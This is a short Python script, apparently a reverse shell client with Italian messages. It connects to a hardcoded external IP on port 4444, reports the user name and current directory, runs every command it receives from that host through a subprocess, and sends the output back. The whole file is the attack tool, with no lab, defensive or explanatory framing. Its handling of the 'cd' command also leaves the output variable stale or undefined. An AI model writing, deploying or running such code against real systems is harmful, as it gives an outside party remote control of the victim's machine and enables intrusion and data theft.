import subprocess
import socket
import os


HOST = '13.62.58.234'
PORT = 4444

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.connect((HOST, PORT))
user = os.getenv('USERNAME')


def main():
    msg = f"{user} || {os.path.abspath(os.getcwd())} >>> "
    try:
        server_socket.sendall(msg.encode())
        while 1:
            command = server_socket.recv(1024).decode()

            if command.lower() == 'exit':
                print("[*] Connessione terminata dal server.")
                break

            if command.startswith('cd '):
                try:
                    os.chdir(command[3:].strip())
                except Exception as e:
                    output = f"Errore: {e}"
            else:
                try:
                    output = subprocess.getoutput(command)
                except Exception as e:
                    output = f"Errore: {e}"

            msg = f"{user} || {os.path.abspath(os.getcwd())} >>> "
            server_socket.sendall((output + "\n" + msg).encode())

    except KeyboardInterrupt:
        return 0
    except Exception:
        return 0


if __name__ == "__main__":
    main()
